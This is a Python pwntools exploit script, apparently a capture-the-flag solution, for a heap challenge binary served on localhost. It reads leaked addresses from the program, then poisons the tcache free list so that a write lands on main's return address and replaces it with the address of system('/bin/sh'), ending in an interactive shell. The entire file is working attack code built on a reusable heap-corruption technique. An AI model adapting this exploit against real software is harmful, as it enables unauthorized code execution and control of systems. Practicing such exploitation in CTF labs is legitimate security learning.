#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("localhost", 9006)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def malloc(index):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil(">")
    p.sendline(index)

def free(index):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline(index)

def write(index, buffer):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(index)
    p.recvuntil(">")
    p.sendline(str(buffer))

p.recvuntil("system('/bin/sh') at >")
exec_binsh_addr = eval(p.recv(14))
log.info('system("/bin/sh") : 0x{:08x}'.format(exec_binsh_addr))
p.recvuntil("Return address of main at >")
ret_main_addr = eval(p.recv(14))
log.info('return address of main : 0x{:08x}'.format(ret_main_addr))

malloc("0")
malloc("1")
free("0")# fd -> 0 -> NULL
free("1")# fd -> 1 -> 0 -> NULL
write("1", hex(ret_main_addr))# fd -> 1 -> ret_main_addr -> NULL
malloc("2")# fd -> ret_main_addr -> NULL
malloc("3")# index 3 can get ret_main_addr
write("3", hex(exec_binsh_addr))
p.recvuntil(">")
p.sendline("4")# exit program && exec system('/bin/sh')

sleep(0.5)

p.interactive()
